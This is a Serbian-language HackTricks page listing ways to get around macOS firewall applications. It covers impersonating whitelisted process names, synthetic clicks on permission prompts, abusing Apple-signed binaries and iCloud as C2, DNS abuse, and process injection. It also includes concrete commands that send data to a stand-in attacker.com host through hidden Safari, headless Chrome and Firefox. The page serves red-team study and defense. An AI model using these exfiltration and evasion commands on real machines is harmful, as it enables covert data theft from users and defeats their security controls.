# macOS Bypassing Firewalls

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Pronađene tehnike

Sledeće tehnike su pronađene da rade u nekim macOS firewall aplikacijama.

### Zloupotreba imena na beloj listi

* Na primer, nazivanje malicioznog softvera imenima dobro poznatih macOS procesa kao što je **`launchd`**

### Sintetički klik

* Ako firewall traži od korisnika dozvolu, maliciozni softver treba **kliknuti na dozvolu**

### **Korišćenje Apple potpisanih binarnih fajlova**

* Kao što su **`curl`**, ali i drugi kao što je **`whois`**

### Dobro poznati Apple domeni

Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima kao što su **`apple.com`** ili **`icloud.com`**. iCloud se može koristiti kao C2.

### Generički Bypass

Neke ideje za pokušaj zaobilaženja firewalla

### Provera dozvoljenog saobraćaja

Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno beloliste domene ili aplikacije kojima je dozvoljen pristup njima

```bash
lsof -i TCP -sTCP:ESTABLISHED
```

### Zloupotreba DNS-a

DNS rezolucije se vrše putem potpisanog aplikacije **`mdnsreponder`**, koja će verovatno biti dozvoljena da kontaktira DNS servere.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem aplikacija pregledača

* **oascript**

```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```

* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox

```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```

* Safari

```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```

### Putem ubrizgavanja procesa

Ako možete **ubrizgati kod u proces** koji je dozvoljen da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Reference

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
